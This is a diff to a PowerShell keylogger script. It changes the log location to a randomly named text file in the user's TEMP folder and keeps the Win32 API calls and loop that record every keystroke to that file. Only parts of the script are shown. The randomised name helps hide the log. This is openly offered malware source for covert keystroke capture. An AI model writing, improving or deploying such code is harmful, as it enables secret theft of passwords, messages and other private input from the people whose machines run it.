@@ -1,6 +1,14 @@
 #requires -Version 2
-function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
-{
+function keylogger{
+  $set = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+  $word += "\"
+  $word += $set | Get-Random -Count 30
+  $word = $word -replace(" ","")
+  $word += ".txt"
+  
+  $ruta = $env:TEMP
+  $ruta += $word
+  $ruta  
   # Signatures for API Calls
   $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
@@ -17,7 +25,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
   # create output file
-  $null = New-Item -Path $Path -ItemType File -Force
+  $null = New-Item -Path $ruta -ItemType File -Force
 
   try
   {
@@ -53,7 +61,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           if ($success) 
           {
             # add key to logger file
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+            [System.IO.File]::AppendAllText($ruta, $mychar, [System.Text.Encoding]::Unicode) 
           }
         }
       }
